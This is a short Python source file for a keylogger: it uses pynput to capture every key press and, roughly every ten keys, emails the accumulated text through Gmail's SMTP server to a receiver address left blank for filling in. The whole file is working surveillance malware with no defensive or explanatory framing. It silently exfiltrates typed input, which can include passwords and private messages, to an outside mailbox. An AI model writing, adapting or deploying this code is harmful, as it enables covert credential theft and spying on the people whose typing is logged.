from pynput import keyboard                 
import smtplib, ssl

key_log = []                                # array for storing keys pressed
count = 0                                                                  
body = ""                                   

def on_press(key):
    global key_log
    key_log.append(str(key))

    global count
    count += 1

    if count > 10:
        count = 0                           # clear count for next loop
        write_email(key_log)                # write to email every 10 counts of key in key log
        send_email(body)
        key_log = []

def write_email(key_log):
    global body
    for log in key_log:
        l = log.replace("'","")             # remove apostrophes that come with every key press
        if log == "Key.space":              # express space key literally as " "
            l = " "
        elif "Key" in log:                  # remove unnecessary special keys
            l = ""
        body += l
    print(body)
    return body

def send_email(body):
    port = 465                              # port for SSL
    smtp_server = "smtp.gmail.com"
    sender_email = ""                       # insert sender email
    receiver_email = ""                     # insert receiver email
    password = ""                           # password/app-specific password

    # create secure SSL context

    context = ssl.create_default_context()

    # create encrypted SSL connection for security 

    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server: 
        server.login("", password)          # insert sender email
        server.sendmail(sender_email, receiver_email, body)

def on_release(key):
    if key == keyboard.Key.esc:             # stop listener on press of esc key
        return False                                                                    

# collect events 

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
